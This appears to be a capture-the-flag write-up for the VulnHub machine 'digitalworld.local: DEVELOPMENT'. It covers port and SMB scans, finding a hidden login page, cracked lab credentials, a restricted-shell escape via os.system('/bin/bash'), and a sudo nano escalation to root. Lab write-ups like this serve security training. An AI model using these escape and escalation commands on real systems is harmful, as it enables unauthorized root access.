# digitalworld.local: DEVELOPMENT

[VulnHub Link](https://www.vulnhub.com/entry/digitalworldlocal-development,280/)

## Port Scanning

We start with a simple port scan and we discover a bunch of open ports, it looks like a linux box with Windows services:

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
...
Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC:
...
```

We can try enumerating the shares on Samba:

```
SMB  digitalworld.local 445    DEVELOPMENT   Share   Permissions     Remark
SMB  digitalworld.local 445    DEVELOPMENT   -----   -----------     ------
SMB  digitalworld.local 445    DEVELOPMENT   print$                  PrinterDrivers
SMB  digitalworld.local 445    DEVELOPMENT   access                  
SMB  digitalworld.local 445    DEVELOPMENT   IPC$                    IPC Service (development server (Samba, Ubuntu))
```

Nothing useful...

## Web Scanning

We can try enumerating the http service on port 8080. In the index page they talk about a host-based intrusion detection system, at first i gnored it but if I tried to fuzz with gobuster the server locked me out for about 10 minutes :( We visited the /html\_pages direcory as the webserver say. After exploring we discovered a useful page, a comment in /development.html hints us about a /developmentsecretpage directory where, after a few more clicks, we found out about an interesting login page on /developmentsecretpage/patrick.php?logout=1. Trying some random credentials the server show us an error: `Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335`

So, what can we do now? Obvious, search the error on the internet. we found an exploit on exploitdb (https://www.exploit-db.com/exploits/7444), after reading the documentation and trying something we foud out that there are user and hash on `/developmentsecretpage/slog_users.txt`

Cracking the hashes we found valid credentials as:

```
intern:12345678900987654321
patrick:P@ssw0rd25
qiu:qiu
```

## Privilege Escalation and Internal Reconnaissance

With credentials we foud out that the user intern can connect with ssh but with a restricted shell, after a few minuted of researching we found out how to escape (https://oscpnotes.infosecsanyam.in/My\_OSCP\_Preparation\_Notes--Enumeration--SSH--lshell\_bypass.html):

```
echo os.system('/bin/bash')
```

As soon we escaped the shell we escalated to the patrick user. Typing `sudo -l` we discovered that we can run nano and vim as all users, from here its easy root thanks to gtfobins:

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

`uid=0(root) gid=0(root) groups=0(root)` We are now root!

## That's was a really cool box and thanks for the reading.

## Hope to see you soon!

_Pedio Zaki_
